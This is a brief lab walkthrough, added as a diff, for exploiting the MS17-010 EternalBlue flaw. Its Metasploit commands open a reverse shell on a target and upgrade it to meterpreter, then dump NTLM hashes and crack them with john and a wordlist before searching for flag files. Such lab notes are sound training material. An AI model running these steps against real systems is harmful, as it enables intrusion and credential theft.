@@ -1,0 +1,31 @@
+This in an eternalblue exploitation lab
+
+nmap -sS TARGET
+nmap -sV -p 135, 139 TARGET
+# there is windows RPC running on 135 (we willl exploit ms17-010)
+msfconsole
+search eternalblue
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS TARGET
+# for some reason they wanted reverse_tcp
+set payload windows/x64/shell/reverse_tcp
+exploit
+# now we will upgrade to meterpreter shell
+use post/multi/manage/shell_to_meterpreter
+set SESSION 1
+# verify that we escalated to NT AUTHORITY\SYSTEM
+shell
+whoami
+# good, now we will migrate to another process that is running at NT AUTHORITY\SYSTEM level
+# this might take you more tries
+ps
+migrate PROCESS_ID
+hashdump
+# we now have a user and his NTLM hash (we take that)
+# we can use hashcat or john to crack it (we will use john)
+john --list=formats | grep -iF "NTLM"
+john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+# cracked. now we're supposed to search for flags
+# first a greedy approach
+search -f flag*.txt
+# when using cat with a full path, put it in quotes
